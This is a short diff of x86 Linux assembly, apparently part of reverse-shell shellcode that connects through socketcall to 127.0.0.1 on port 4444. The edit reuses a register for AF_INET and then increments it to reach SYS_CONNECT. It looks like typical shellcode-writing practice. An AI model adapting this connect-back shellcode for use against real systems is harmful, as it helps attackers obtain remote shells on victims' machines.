@@ -32,7 +32,8 @@ _start:
 	
 	mov al, 0x66		; socketcall (102)
 
-	mov bl, 0x3		; SYS_CONNECT (3)
+	mov bl, 0x2		; SYS_CONNECT (3)
+
 
 	sub edx, edx
 	push edx		; NULL Terminator 
@@ -40,7 +41,7 @@ _start:
 	push 0x0100007f		;s_addr = 127.0.0.1
 	push word 0x5c11	; sin_port = 4444
 
-	push bx			; AF_INET (2)
+	push bx 		; AF_INET (2)
 
 	mov ecx, esp		; point ecx to top of stack
 
@@ -50,6 +51,7 @@ _start:
 
 	push esi		; socketfd
 	
+	inc ebx
 	mov ecx, esp		; point ecx to top of stack 
 	int 0x80		; execute connect 
 	
